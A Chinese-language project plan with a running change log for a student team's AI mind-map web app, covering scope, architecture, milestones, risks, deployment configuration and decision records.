# 项目执行计划 v1.4

> 定稿 2026-11-02 · 答辩 2026-12-01 · RPeGio 与陈嘉涛 · 各 20–25 小时/周
> **冲突时以本文件为准**，并回写 `README.md`（申报书整理版只保留叙述，不再承载技术栈承诺）。

## 0 一页摘要

| 项 | 结论 |
|---|---|
| 验收对象 | 学校 Web 社团复试：① 讲清代码逻辑 ② 独立部署运行（含数据库与基建）③ GitHub 留档 ④ 允许用 AI、严禁完全依赖 |
| 交付物 | 线上系统 + 本地演示环境 + 架构文档 + 5 分钟演示脚本 + PPT + 20 题自测 |
| 分工 | **A**（RPeGio）：契约、前端、画布/布局/主题/导出、协作客户端、部署基建、CI；**B**（陈嘉涛）：生成链路、多模态解析、RAG、诊断、代理、评估集、后端地基 |
| 交界 | 契约、SSE 协议、协作协议、上线联调 —— 改动必须双人 review |
| 前端 | Vue 3 + TypeScript + Vite + Pinia + Tailwind + `@vue-flow/core` + Vitest |
| 后端 | FastAPI + Pydantic v2 + httpx + `sqlite3` 直连；`pydantic-settings` / SQLAlchemy / Alembic 顺延到验收之后（Q35），当前配置经 `os.getenv` 读取，见第 10 节 |
| 数据 | PostgreSQL 16（compose 容器）+ pgvector（W3） |
| 协作 | Yjs + `y-websocket`（独立 Node 容器） |
| 部署 | 阿里云 ECS 2C2G / 40G ESSD / Alibaba Cloud Linux 3.2104 / 华南1深圳 / 无 GPU，`docker compose` 五容器，公网 `IP:8080` |
| 铁律 | 深度优先；每个功能能口头讲清数据流；不返回假成功；**11/22 功能冻结** |

## 1 考核点 → 硬门

| 考核点 | 落地动作 | 面试证据 |
|---|---|---|
| 讲清代码逻辑 | 每个 PR 附「讲解稿」：做什么 / 为什么这么写 / 边界与失败路径；每周互讲 30 分钟；面试前 20 题抽问 | PR 历史 + 白板讲架构 |
| 独立部署运行 | Compose 五容器 + PG 迁移 + 备份脚本 + 健康探针 + 一键部署脚本 | 现场 `curl /api/health`，`docker compose ps` |
| 含数据库及基建 | PG 实例、Alembic 版本、每日 `pg_dump`、Nginx 反代、systemd/compose 自启、swap | 打开备份目录与迁移历史 |
| GitHub 留档 | `main` / `dev` / `feat/*`·`fix/*`，PR 双人 assign，Conventional Commits（中文），阶段 tag | 分支图 + tag 列表 |
| 不许完全依赖 AI | 讲解稿制度 + 抽问 + 每人对**另一侧**至少一个核心模块可讲 | 交叉抽问当场答 |

## 2 范围：L1 / L2 / L3

**L1（≈60% 工时，必须讲到实现细节）**

| 编号 | 内容 | 验收门 |
|---|---|---|
| — | 契约 v2 + 迁移 + OpenAPI 类型生成 | 双端类型零手写 |
| F01 | 文本/关键词/段落 → 层次节点（真实模型） | 10 条中文样本人工通过 |
| F04 | 画布：增删改、拖拽、撤销重做、搜索定位、折叠 | 快捷键可用，操作有测试 |
| F09a | 自动布局：导图 / 逻辑结构 / 时间轴 | 三种可切换且稳定不重叠 |
| F10 | 主题：3 套预设 + 主色/字体/方向自定义，随导图保存 | 重开可恢复 |
| F20 | 导出：Markdown / PNG / SVG / PUML | 中文不乱码 |
| — | 保存/打开/乐观锁 409、未保存提醒 | 冲突场景脚本可复现 |
| F22 | 容器化部署 + 备份 + 健康检查 | 一键脚本从零起服务 |
| F23a | pytest + Vitest + CI 双端绿灯 | 覆盖率 ≥60% |
| F26 | 延迟埋点与 P50/P95 报告 | 报告含模型与并发说明 |
| — | 最小 JWT 登录 + 每用户 BYOK（Fernet 加密） | 密钥明文永不出服务端 |

**L2（≈30%，每项一条能跑通的演示链路，允许薄、不允许假）**

| 编号 | 内容 | 薄切片的边界 |
|---|---|---|
| F05 | PDF / DOCX / PPTX 导入 | **已实现（与原计划不同）**：PDF 不再是「只取文本层」，改为逐页渲染交模型视觉识别，扫描件同样适用，视觉不可用时才回落文本层；页数由上下文预算动态算出（另有 300 页护栏），不再有固定页数上限。DOCX/PPTX/XLSX/HTML/MD 走 Docling，`.doc`/`.ppt` 经 LibreOffice 转 PDF，`.xls` 用 xlrd 直读。见 [部署文档](DEPLOY.md) |
| F06 | 图片/草图 → 导图 | **已实现基础链路**：单图经 `MINDMAP_LLM_MODEL` 多模态直转 Markdown（与 PDF 逐页共用调用），不收 SVG；「识别结果先给候选、人工修正」未做 |
| F07 | 语音 → 导图 | **已实现（与原计划两度不同）**：先放弃 sidecar 改走云端，再把 ISI 一句话识别换成百炼 `qwen-audio-3.1-asr-flash`。当前能力：≤300 秒单次、句级时间戳、双声道分路识别后合并。见 [部署文档](DEPLOY.md) 第 6 节 |
| F08 | 混合输入（文本+图+音） | 复用 `Source[]` 合并，保留来源标签 |
| F03 | 会议纪要/碎片文本整理 | 专用 prompt + 2 个测试 |
| F02 | 目标驱动框架生成（AI 代理） | 四阶段可见，产出导图，不承诺多轮代理 |
| F12 | 上传自己的文档当知识库 | 单用户、单知识库、手动重建索引 |
| F13 | RAG 带引用 | pgvector；节点级 `source_refs`；不宣称"事实验证" |
| F15 | 结构诊断 + 建议确认 | 3 条规则 + 1 次 LLM 检查；建议必须用户确认 |
| F16 | 跨节点关系建议 | 只产出 `relations` 候选，不自动改树 |
| F17 | 实时协作 | 单房间、两角色、在线同步；离线恢复不做（Q36：保留，排期延后） |
| F18 | 协作中的 AI 汇总 | 房间消息 → 一次性总结，不自动改图 |
| F19 | 翻译 | 选中节点单次翻译，不承诺"实时" |
| F11 | 偏好学习 | 只记录最近使用的主题/布局并给推荐按钮 |
| F24/F25 | 评估口径与首轮报告 | 见第 5 节 |

**L3（≈10%，只写文档与 PPT，明确标注"未实现"）**
F09 鱼骨图、F14 知识图谱嵌入对比实验、F21 模型微调、F22 Kubernetes、F23 压力测试集群、F19 多语言实时同传。

> 规则：L3 项在系统内**不出现入口**（不返回占位数据），只在文档与 PPT 的"路线图"页出现。

## 3 技术架构定稿

```
浏览器 (Vue3 SPA)
  ├── REST /api/*  ──────────────►  api (FastAPI, uvicorn)
  ├── SSE /api/generation-tasks/{id}/events ─┘
  └── WS  ──►  ys (y-websocket, Node)  ──► 快照落盘 + PG
        api ──► PG16 (业务数据 / 用户 / llm_calls / 知识库向量)
        api ──► asr (sidecar: moss | aliyun | faster-whisper)
        api ──► DeepSeek (deepseek-flash: 文本 + 视觉)
        nginx ──► 静态文件 + 反向代理 + TLS（W4）
```

**关键取舍（答辩要能讲）**

1. **生成改单次流式**：一次模型调用，边收 token 边解析 JSON，节点逐个推送（首节点 1–2 秒、完整 2–3 秒）。曾在「两段式（先骨架再展开）」与「单次增量」之间做过对比，最终保留单次增量：调用次数减半、代码与测试都更简单。代价是中途失败没有「保留骨架」的降级结果。详见 [ARCHITECTURE_ADDENDUM.md](ARCHITECTURE_ADDENDUM.md)。
2. **存储换 PG 不再保留 SQLite 双轨**：部署要求"含数据库"，协作快照、`llm_calls`、pgvector 都要真库；双轨会让测试与迁移分叉。开发与 CI 都用 compose 起的 PG，单测用事务回滚隔离。
3. **协作必须真 CRDT**：现有乐观锁只能防覆盖，无法合并并发编辑。Yjs 单房间 + 房间 token（api 签发）+ 30s 快照。映射层（`MindMapContent` ↔ `Y.Map`）自研，这是能讲清的技术点。
4. **视觉直接用 `deepseek-flash`，不引入第二家**：该模型原生支持图片输入，三种传法（base64 内联 / 外链 / Files API `file_id`），单图上限 32 MiB（base64）或 64 MiB（file_id），请求体 48 MiB，每图最多计 1024 token，且图片只能出现在 `user` 消息中。我们走**前端压缩到 1600px → base64 内联**，草图为一次性输入，不需要 Files API 复用。
5. ~~**ASR 做成可插拔 sidecar**~~ **（已推翻，2026-11-04；后续又换过一次实现）**：原计划 `moss`（默认，带说话人分离）/ `aliyun`（线上备选）/ `faster-whisper`（降级档 + 评测基线），线上 2C2G 不常驻 MOSS 模型。第一次实测后排除了本地方案——`sherpa-onnx` paraformer-zh-small 在 2C2G 上常驻 143 MB、短音频 RTF 0.013，但架构吃不下长输入（33.8 秒整段 CER 86.4%，60 秒直接返回空串并抛 onnxruntime Reshape 错误）。第二次实测又把云端接口从 ISI 一句话识别换成百炼 Qwen-Audio-ASR：后者自带句级/词级时间戳、60 秒音频快 2.8 倍、便宜 3.9 倍、单次时长从 60 秒放宽到 300 秒（见 v1.7）。多后端抽象始终没有价值——每次都只有一条路能跑通，留着切换开关等于维护几个用不上的分支。数字见 [部署文档](DEPLOY.md) 第 6 节。
6. **不做**：Celery/Redis、K8s、微服务拆分、Docling、本地 LLM、多租户 RBAC、OSS/CDN。

**2C2G 内存预算（含 swap 2G）**

| 容器 | 常驻估算 |
|---|---|
| 系统 + Docker | 300 MB |
| postgres | 180 MB（`shared_buffers=128MB`、`work_mem=4MB`） |
| api（1 worker） | 200 MB |
| ys（Node） | 90 MB |
| nginx | 20 MB |
| asr | **默认不启动**（compose profile `asr`） |
| 合计 | ≈790 MB，余 1.2 GB 给突发 |

## 4 四周里程碑

| 周 | 交付物 | 周五验收门（能演示的东西） |
|---|---|---|
| **W1** 11/2–11/8 | 契约 v2 + 迁移 + OpenAPI 类型生成；Vue 前端重建；单次流式生成（SSE + 增量解析）+ 真实模型；后端地基（settings/httpx/pytest/alembic/错误体/日志/request_id）；CI；Compose 骨架；**IP:8080 上线空壳**；四份文档同步改 | 浏览器里输入一句话 → 画布上逐节点长出导图，刷新后能打开 |
| **W2** 11/9–11/15 | 三布局；主题；四格式导出；PDF/DOCX/PPTX 导入；JWT + BYOK（画布编辑与撤销重做已由 R3 在 11/4 提前完成，本行不再占用 W2 工时） | 导入一份 PDF 出导图；同一导图在另一窗口打开后保存会提示版本冲突（409） |
| **W3** 11/16–11/22 | 图片草图；语音转写接入（原计划 sidecar，实际走云端 API）；RAG + pgvector + 节点引用；诊断/建议；AI 代理；翻译；评估脚本与首轮报告；（余量）Yjs 两窗口协作、PG 迁移 + 备份（Q35/Q36） | 上传一张手绘草图 → 导图；问知识库一个问题 → 导图节点带引用 |
| **W4** 11/23–11/29 | **功能冻结（11/22 24:00）**；Bug 修复；演示脚本彩排；20 题抽问；PPT + ADR + README 收尾；域名/CF 切换（可选）；`v1.0.0` tag | 5 分钟完整演示不卡壳，全部本地 + 线上双跑 |
| **缓冲** 11/30–12/1 | 只修 P0；现场环境预热；静态截图与录屏备份 | 断网也能讲完 |

每周节奏：周一 30 分钟对齐（本周目标/风险）；周三 15 分钟同步；周五 30 分钟互讲 + 合并 `dev`；周日 `dev` → `main` 并打 tag。

**上线节奏（Q32 定）**：W1 只上 `IP:8080`（安全组放通 22 + 8080），日常开发与答辩演示都以"公网 IP 在校园网可达"为准；域名 + Cloudflare 推迟到 W3 视备案进度，W4 仍作可选项。W1 不做 TLS，nginx 先只做静态与反代。

## 5 验收门与指标口径

**工程门（12 条，全部可勾选）**
1. 后端覆盖率 ≥60%（pytest + `--cov`） 2. 前端组件测试覆盖关键交互 3. CI 双端 lint/test/build 全绿 4. 统一错误体 `{code, message, detail, request_id}` 5. 结构化日志 + `request_id` + `llm_calls` 埋点 6. 单一配置源 + `.env.example`（当前经 `os.getenv` 读 5 个 `MINDMAP_*` 变量，样例文件已齐；`pydantic-settings` 随 Q35 顺延） 7. `docker compose up -d` 一键起 8. `/api/health` + readiness 9. ADR 每决策一页 10. PR 模板 + 契约变更 checklist 11. 种子数据脚本 12. 部署与回滚文档

**指标口径**
- **结构合理性 >85%**：20 条中文样本（课程大纲 / 会议纪要 / 项目立项），双人独立盲评 4 维度（覆盖、层次、无捏造、可读），报一致率与分歧，通过率 = 双人一致判"合格"的比例。
- **多模态支持率 ≥90%**：文本 / 图片 / 语音各 30 个样本；"成功" = 解析出非空 `Source` **且** 生成合法 `MindMapContent`。
- **响应时间 <3s / <5s**：分开报**首节点延迟**与**完整导图延迟**的 P50/P95，注明模型、并发数、是否流式；不承诺绝对值（申报书两处目标本身矛盾，已在 `docs/FEATURES_AND_OWNERS.md` F26 标注）。

## 6 风险表

| ID | 风险 | 概率 | 影响 | 触发信号 | 预案 |
|---|---|---|---|---|---|
| R1 | 域名备案 7–20 天不可控 | 高 | 中 | 11/15 未过审 | 全程 IP:8080 演示，域名只作 PPT 里的"已备案/已解析"截图 |
| R2 | CF 代理国内访问波动 | 中 | 中 | 首包 >1s 或超时 | 演示脚本默认走 IP；CF 版仅作公开展示 |
| R3 | 2C2G 内存吃紧（PG+api+ys） | 中 | 高 | OOM killer / swap 抖动 | swap 2G；PG 调参；asr 不常驻；必要时把 ys 与 api 合并进程 |
| R4 | 语音质量/时长不达预期 | 中 | 中 | 单次 ≤300 秒，超出返回 400 | 已放宽到 300 秒（原计划 60 秒）；不用本地模型，无 MOSS 依赖 |
| R5 | 草图识别质量差 | 中 | 中 | 20 张样本合格率 <60% | 改为"草图 → 候选节点列表，用户勾选后生成"，产品上更诚实 |
| R6 | Vue 重建拖到 W2 | 中 | 高 | 11/6 画布不能拖 | 砍主题自定义与鱼骨，先保编辑与保存 |
| R7 | Yjs 映射层比预期复杂 | 中 | 中 | 11/13 两窗口仍不同步 | 降级为"在线状态 + 最后写入者胜 + 冲突提示"，并在文档写明 |
| R8 | B 侧 RAG/代理进度 | 中 | 中 | 11/18 未跑通 | 降 L3 只讲不做，保 F01/F05/F06/F15 |
| R9 | 模型结构化输出不稳定 | 中 | 中 | 校验失败率 >20% | 原生 JSON Schema 优先 + 提示词回退 + 一次修复重试 |
| R10 | 整体滑期 | 中 | 高 | 任一周五验收门未过 | **周末补**，不从 W4 缓冲借；连续两周滑则砍 L2 后三项 |
| R11 | 密钥/额度被刷 | 低 | 高 | 异常调用量 | BYOK + 每用户日限 200 次 + 演示账号单独限额 |
| R12 | 契约变更冲突 | 中 | 中 | 同一文件双改 | 契约文件 CODEOWNERS 双人、变更走 PR + 迁移脚本 |

## 7 协作流程

- **分支**：`main`（保护，仅 PR 合入）← `dev`（集成分支）← `feat/*`、`fix/*`。`dev` 阶段性合入 `main` 并打 tag（`v0.1.0`、`v0.2.0`、`v1.0.0`）。
- **提交**：中文 Conventional Commits（`feat(canvas): 支持节点拖拽`），单提交 ≤ 半天工作量，禁止 `--force`。
- **PR**：模板三问必填——「这段代码做什么 / 为什么这么写 / 我怎么验证的」；**必须另一人 review 并 assign 后**才可合并；契约相关 PR 追加迁移脚本与双端类型生成结果。
- **互讲**：每周五 30 分钟，讲的人不得照读代码；听的人负责在 20 题清单里勾掉对应问题。
- **文档**：改契约 → 同步 `docs/CONTRACT_V2.md` 与 `frontend` 生成类型；改流程 → 改本文件并升版本号。

## 8 5 分钟演示脚本

| 时间 | 动作 | 讲到什么 |
|---|---|---|
| 0:00–0:30 | 打开线上地址，登录 | 架构一句话 + 部署形态（compose / PG / IP） |
| 0:30–1:10 | 输入「帮大二学生规划一学期机器学习学习路线」 | 流式生成：SSE 逐节点长出来，首节点 1–2 秒、整棵树 2–3 秒 |
| 1:10–2:10 | 画布编辑：拖拽、折叠、撤销、切布局、换主题 | 数据结构 v2、布局算法（tidy tree）、undo 栈 |
| 2:10–2:50 | 上传一张手绘草图 → 生成；上传一份 PDF → 生成 | 多模态：视觉模型与文档解析、来源记录 |
| 2:50–3:30 | 开第二个窗口，实时协作；@AI 总结 | Yjs/CRDT 如何解冲突、房间 token |
| 3:30–4:10 | 知识库提问 → 节点带引用；点"结构诊断" → 确认建议 | RAG 检索链路、建议必须用户确认 |
| 4:10–4:40 | 导出 PNG/Markdown/PUML | 导出一致性 |
| 4:40–5:00 | 切到 GitHub：分支图、tag、CI 绿灯、PR 讲解稿 | 留档与工程纪律 |

## 9 明确不做（评委问起就这么答）

Docker Swarm/K8s、多租户与权限矩阵、离线协作与冲突合并 UI、模型微调训练、知识图谱嵌入落地、压测集群、i18n、移动端适配、支付与配额计费、对象存储/CDN。

## 10 配置项

### 10.1 已实现（代码经 `os.getenv` 读取）

`.env` 文件不会自动加载，须在启动服务前设入进程环境变量；样例见 `backend/.env.example`。下表只列主要项，检索链路与图存储的几个开关（`MINDMAP_PARENT_RETRIEVAL`、`MINDMAP_GRAPH_SEARCH`、`MINDMAP_EMBEDDING_MODEL`、`MINDMAP_EMBEDDING_DIM`、`MINDMAP_NEO4J_URI/USER/PASSWORD/DATABASE`）和 `MINDMAP_VERSION` 见 `.env.example` 与 `docs/RAG-DECISIONS.md`。

| 变量 | 默认 | 说明 |
|---|---|---|
| `MINDMAP_LLM_MODE` | `demo` | `demo` 不联网、返回本地占位；`model` 才调 Chat Completions 兼容接口。写成其他值会被拒 |
| `MINDMAP_LLM_BASE_URL` | — | 模型服务地址，须以 `http://` 或 `https://` 开头 |
| `MINDMAP_LLM_API_KEY` | — | 调用密钥，只从环境变量读，不进代码库与日志 |
| `MINDMAP_LLM_MODEL` | — | 模型名，由服务商决定。当前线上用 `z-ai/glm-5.3-flash`（端点 `https://api.commandcode.ai/provider/v1`），此前用 `deepseek-flash`。PDF 视觉识别与图片识别复用同一组变量 |
| `MINDMAP_DB_PATH` | `backend/data/mindmaps.db` | SQLite 文件路径，留空即取默认值 |
| `DASHSCOPE_API_KEY` | — | 百炼语音转写（F07）。没配时 `.wav` 上传返回 422 |
| `MINDMAP_SOFFICE_CMD` | — | `soffice` 完整路径；不配则从 `PATH` 找。`.doc`/`.ppt` 转换需要 |
| `MINDMAP_AGENT_ENABLED` | `1` | 设为 `0` 关闭 `/api/agent/runs/stream` |
| `MINDMAP_NLI_ENABLED` | `0` | 打开引用语义复核（ONNX 模型），否则只做机械核验 |
| `MINDMAP_NLI_MODEL_DIR` | — | ONNX 模型目录（含 `model.onnx` / `tokenizer.json` / `config.json`） |
| `MINDMAP_NLI_MIN_FREE_MB` | — | 加载模型前要求的最小可用内存，不够则跳过 NLI |
| `MINDMAP_LIBRARY_SEARCH` | `1` | 生成时要不要从本地知识库捞材料。线上置 `0` 做纯展示（等记忆模块落地再开）；**不影响** `GET /api/knowledge/library` 只读入口 |
| `MINDMAP_LIBRARY_REMEMBER` | `1` | 生成时把用到的材料收进知识库。只有 `"0"` 表示关。与上面那个开关独立 |

### 10.2 规划中（当前代码不读这些变量）

| 变量 | 依赖功能 | 状态 |
|---|---|---|
| `APP_ENV` | 区分 dev / prod | 未排期 |
| `DATABASE_URL` | PostgreSQL 迁移 | Q35：顺延到验收之后 |
| `JWT_SECRET` / `JWT_TTL_HOURS` / `FERNET_KEY` / `DAILY_LLM_QUOTA` | 登录签发、BYOK 加密、每日配额 | F12 为单用户单库，暂不需要 |
| `ASR_BACKEND` / `ASR_URL` / `ASR_MAX_SECONDS` / `ASR_WHISPER_MODEL` / `ASR_WHISPER_COMPUTE` | 语音转写（F07） | **已作废**。原计划的多后端（MOSS / faster-whisper / aliyun）没有落地。实际语音只用一个变量 `DASHSCOPE_API_KEY`（阿里云百炼），见 [部署文档](DEPLOY.md) 第 6 节。选型理由：本地方案在 2C2G 上吃不下长输入（33.8 秒整段 CER 86.4%），云端接口则自带时间戳且更便宜 |

### 10.3 不是环境变量，是代码常量

改动这两项要改代码并重新部署：

| 常量 | 位置 | 当前值 |
|---|---|---|
| `MAX_UPLOAD_BYTES` | `backend/app/ingestion/router.py` | 10 MB（文档） |
| `MAX_AUDIO_BYTES` | 同上；前端 `stores/mindmap.ts` 同口径 | 20 MB（WAV，约 11 分钟） |
| `MAX_SLICE_SECONDS` | `backend/app/ingestion/asr.py` | 300（Qwen-Audio-ASR 服务端硬限，360 秒返回 `AUDIO_DURATION_TOO_LONG`） |

## 11 决策记录（Q26–Q36）

| # | 决策 | 理由 / 影响 |
|---|---|---|
| Q27 | ~~ASR 默认 MOSS，`faster-whisper` small-int8 为降级档~~ **已推翻**：改用云端 API，不做 sidecar 也不保留多后端开关。云端具体用哪家后来又换过一次（ISI 一句话识别 → 百炼 Qwen-Audio-ASR，见 v1.7） | 原理由是"2C2G 上 large-v3 不可用"。实测后更彻底：本地方案连长一点都吃不下——33.8 秒整段 CER 86.4%、60 秒直接返回空串，只能处理 10 秒以内片段。只有一条路能跑通时，可插拔抽象只剩维护成本。见第 4 节第 5 条与 [部署文档](DEPLOY.md) 第 6 节 |
| Q28 | 全部服务跑在同一台 ECS，`IP:8080` 暴露 | 2C2G 无法拆机；单机 compose 也最符合"独立部署"的考核表述 |
| Q29 | BYOK：用户自带 key、服务端 Fernet 加密存库、每用户每日 200 次、前端不落明文、演示账号单独限额 | 密钥不进代码库、不进日志；额度与滥用风险由 R11 兜底 |
| Q30 | `main` ← `dev` ← `feat/*`·`fix/*`；PR 目标一律 `dev` | `dev` 已从 `main` 拉出（空提交起点），`docs/project-plan` 的 PR 目标改 `dev` |
| Q31 | A：契约 / Vue 画布 / 布局主题导出 / 协作客户端 / 部署基建 / CI；B：后端地基 / 生成链路 / 多模态解析 / RAG / 诊断 / 代理 / 评估集 | W1 两条线并行：B 做 D1–D3，A 做 D2 契约 + D4 画布 + D5 部署，W2 起交叉 review |
| Q32 | W1 只上 `IP:8080`，域名与 CF 推迟 W3 | 备案不可控（R1）；验收只看"能独立部署并访问"，TLS 不是硬门 |
| Q33 | 前端换 Vue 生态（陈嘉涛已同意）；**先做 D4**（R1 骨架、R2 画布、R3 编辑保存） | 前端负责人只熟 Vue；R1 已完成（PR #3），画布是答辩主视觉，优先于后端地基 |
| Q34 | 双人 review **仅**在 fork → 上游 PR 时强制；本仓库 dev 分支的 PR 由提交人自己 review 后合并 | 仓库是 fork，日常产出先落在自己仓库；向上游提 PR 时再走 `CODEOWNERS`，由 RPeGio 与陈嘉涛互相 assign |
| Q35 | **后端地基压缩**：采纳陈嘉涛在 `NEXT-PLAN.md` 的建议，W1 只做「统一错误体 + `urllib`→`httpx`」两项；SQLAlchemy / Alembic / PostgreSQL 迁移顺延到**验收之后**，v1 继续 `sqlite3` 直连 | RPeGio 2026-11-03 确认。理由：契约 v2 与 ORM 迁移无法在 W2 前同时装进两地排期；错误体与 httpx 已由陈嘉涛在 `027b0c9` 落地。影响：第 3 节架构图中的 PG16、第 5 节验收门第 7 条（compose 五容器含 `db`）同批顺延到验收后，W1–W3 以 SQLite 单文件 + 备份脚本兑现"含数据库"的部署要求 |
| Q36 | **实时协作（F17）保留，但排期延后**：不设 W2 硬门，W3 有余量再做，无余量则降级为文档说明 | 陈嘉涛倾向实现协作，RPeGio 同意保留该功能（`NEXT-PLAN.md` 原提议"W2 不做协作"不再成立）；协作依赖画布稳定与 save/undo 语义，先做完 R2–R3 再评估余量，避免两条线并行时相互阻塞 |
| Q37 | **`main` 转为生产分支**：`main` ← `dev` ← `feat/*`；里程碑时 `dev` → `main` 合入并在 `main` 上打 tag，部署与回滚都以 tag 为准，ECS 只跟 `main` | 核心功能（生成、画布、编辑保存、多来源、引用、导出）已打通，需要一个稳定的"线上是什么"的答案；此前 main 与 dev 长期同步推进，无法区分"能演示"与"正在改"。`dev` 保留为集成分支，未验证完的改动不落到生产 |

## 12 变更记录

| 版本 | 日期 | 变更 |
|---|---|---|
| v1.0 | 2026-11-02 | 首版定稿（基于四轮需求澄清，见 PR 描述） |
| v1.1 | 2026-11-02 | 补 Q27–Q32 决策、ASR 降级档与 `ASR_WHISPER_*` 配置、上线节奏（W1 仅 IP:8080） |
| v1.2 | 2026-11-02 | 补 Q33（Vue 生态 + 先做 D4）/ Q34（review 边界）；R1 已完成，R2–R3 进行中 |
| v1.3 | 2026-11-03 | 补 Q35（后端地基压缩：错误体 + httpx，ORM/PG 顺延验收后）/ Q36（实时协作保留但延后，W2 去掉 Yjs 硬门）；分工与决策行改具名（RPeGio / 陈嘉涛），不再用"队友""双方" |
| v1.4 | 2026-11-04 | R3 完成：画布编辑、撤销重做（整树快照 50 步）、保存与乐观锁 409、打开列表落地，W2 相应工时腾出；前端用例 81；新节点正文复用 v2 `Node.note`（H1，待陈嘉涛在 PR 审查确认） |
| v1.5 | 2026-11-04 | F07 语音落地，推翻 Q27：放弃 MOSS / faster-whisper 与 sidecar 方案，改走云端。补 `MAX_AUDIO_BYTES` 与 `MAX_SLICE_SECONDS` 常量；前端录音受限于安全上下文，与 Q32「IP:8080 不做 TLS」冲突，已记入架构文档 |
| v1.6 | 2026-11-05 | F06 图片输入落地；F08 混合输入与节点级引用（三层校验 + 可选 NLI）；F20 三种导出接通前端 |
| v1.7 | 2026-11-05 | 语音接口二次切换：ISI 一句话识别 → 百炼 `qwen-audio-3.1-asr-flash`。换来句级时间戳、300 秒单次上限、60 秒音频快 2.8 倍且便宜 3.9 倍；依赖 `websockets` 与 `aliyun-python-sdk-core` 一并移除，`MAX_SLICE_SECONDS` 60 → 300 |
| v1.8 | 2026-11-06 | 生成链路 Agent 化：受限 tool-calling 循环（四个工具、`RunBudget` 预算）、op 契约与两端共读用例、SSE v2 事件、前端候选确认（`docs/AGENT_PLAN.md`）。`/api/agent/tasks` 仍是桩；F02/F03/F16 转「部分实现」 |
| v1.9 | 2026-11-07 | 文档对账：功能清单加实现日期、能力与端点按代码现状重写（当时 19 个端点、无 501 路由、`source_refs` 属 v1）、配置项补 6 个变量；`NEXT-PLAN.md` 加日期同步说明 |
| v1.10 | 2026-11-07 | 节点来源引用进界面（F08，`fc8f82f`）：画布角标显示条数、详情面板列来源与位置、右侧抽屉看原文并高亮命中句；原文不落库，跨会话只剩 `quote`。「每个来源被几个节点引用」的反向索引放 P2 |
| v1.11 | 2026-11-08 | 引用反向索引（P2）：左侧来源行标注被几个节点引用、内联节点列表可跳转、未引用来源标 amber；撤销栈改按 10MB 字节上限（节点上限提到 1000 后只按步数会失控）；新增 docs/TODO.md 记录文件占用，避免两人同改 stores/mindmap.ts |
| v1.12 | 2026-11-10 | 契约 v2 在后端落地（P3 第一步）：`schema_version`、`note`、`layout`（新增 `vertical`）、`theme`、`relations`、`style`/`pos`/`collapsed` 进 `backend/app/contracts/mindmap.py`；旧记录读时补默认值（`migrate_content()`），不跑一次性脚本；导出改取 `note or label`；v1 请求体继续接受 |
| v1.13 | 2026-11-10 | 契约 v2 前端接线（P3 第二步）：详情面板可直接编辑节点正文（`note`，≤2000 字），保存 / 打开 / 导出都按 v2 发，`toContractV1()` 与 `toExportV1()` 删除；朝向（`layout` + `theme.direction`）随内容持久化，重新打开能恢复原布局，向下对应 `layout: vertical`；`relations` / `style` / `pos` / `collapsed` 原样透传不丢。H1 结案（陈嘉涛已在 PR #13 认可） |
| v1.14 | 2026-11-10 | 契约类型生成与漂移防线：新增 `backend/scripts/export_openapi.py` 导出 `backend/openapi.json` 快照，`npm run gen:api` 用 openapi-typescript 生成 `frontend/src/api/schema.d.ts`；手写镜像保留，但由 `frontend/src/api/contract-check.ts` 在 `vue-tsc` 期间断言与生成类型一致（键集合 + 抹平可空性后的形状）；`pytest` 增快照过期检查、CI 两个 job 各加"重新生成 + `git diff --exit-code`" |
| v1.15 | 2026-11-10 | ECS 上线骨架（F22 部分实现）：`deploy/install.sh`（Alibaba Cloud Linux 3：dnf 依赖 → swap → `genai` 服务账号与目录 → uv 装 CPython 3.12 与依赖 → systemd → nginx 站点 + Basic Auth + 每日备份 cron）、`deploy/genai-mindmap.service`、`deploy/nginx.conf`（同源反代、SSE 关缓冲、上传 24m、读超时 900s）、`deploy/backup.sh`（`sqlite .backup` 而非 `cp`）、`docs/DEPLOY.md` 第 9、10 节。仍然不做 Docker/compose |
| v1.16 | 2026-11-11 | `main` 转为生产分支（`Q37`）：里程碑 `dev` → `main` + 打 tag，ECS 只跟 `main`；`docs/DEPLOY.md` 第 9.1、10 节按此改写（生产 clone 默认分支、更新走 tag、回滚步骤与契约回滚的数据风险）；`START_HERE.md` 分支规则同步 |
| v1.17 | 2026-11-11 | 部署骨架按交叉复核修八处：日志目录交给 systemd `LogsDirectory`（原 `ReadWritePaths` 指向不存在目录会 226/NAMESPACE）；`EnvironmentFile` 去掉 `-`，缺文件即启动失败而非静默回落只读路径；`TimeoutStopSec` 20 → 660 对齐 600 秒生成预算；nginx 的 `listen [::]:80` 改为按 IPv6 可用性生成（`nginx -t` 查不出 bind 失败）；`/opt` 下 dist 补 SELinux 上下文 `httpd_sys_content_t`；certbot 改 `certonly --webroot`，443 由 `deploy/nginx-tls.conf` 渲染，重跑安装脚本不再冲掉 TLS；覆盖前把代码快照到 `/var/lib/genai-mindmap/releases/`，第 10 节回滚改为解包快照（`/opt` 不是 git 工作区，`git switch` 改不到在跑的代码）；`Q37` 登记进 `docs/HANDOFF.md` 的 H3 |
| v1.18 | 2026-11-11 | 依赖安装不再依赖公网：`deploy/setup-python.sh` 的 PyPI 源改成"公网阿里云 → ECS 内网镜像 → 官方"依次尝试（http 源自动带 `--trusted-host`），新增 `docs/DEPLOY.md` 第 11 节讲出网受限时的探测与离线安装；同时修掉 DEPLOY 章节号重复——原 ECS 两节顺延为第 9、10 节，交叉引用（`deploy/install.sh`、`START_HERE.md`、`TEAM-GUIDE.md`、`FEATURES_AND_OWNERS.md`）一并改指 |
| v1.19 | 2026-11-13 | 可观测性（线上排障被"看不见模型说了什么"卡住）：`/api/health` 的 `version` 改为读 `MINDMAP_VERSION`（缺省 `dev`），页面标题旁显示版本徽章；`done` 事件在没有产出候选时带 `text` / `reasoning`（各截断 4000 字），右侧"模型协作"面板直接显示模型原话与思考，不再依赖 `journalctl` 里那条未必出现的 WARNING；`deploy/install.sh` 新增 `--version` 参数（tar 包没有 `.git`，`git describe` 拿不到 tag） |
| v1.20 | 2026-11-13 | 部署自动化：新增 `.github/workflows/deploy.yml`，**打 tag 即发布**（构建前端 → `git archive` → scp → `install.sh --version <tag>` → 换 dist → reload → 用 `/api/health` 比对版本号自检，不一致让 job 红）；`docs/DEPLOY.md` 第 12 节写一次性配置（4 个 secret、部署专用 ed25519 密钥、22 端口必须公网可达的安全前提与 fail2ban）、日常发布与 `workflow_dispatch` 回滚。选择"Actions 推"而不是"服务器拉"的原因：这台 ECS 连不上 GitHub，self-hosted runner 也起不来 |
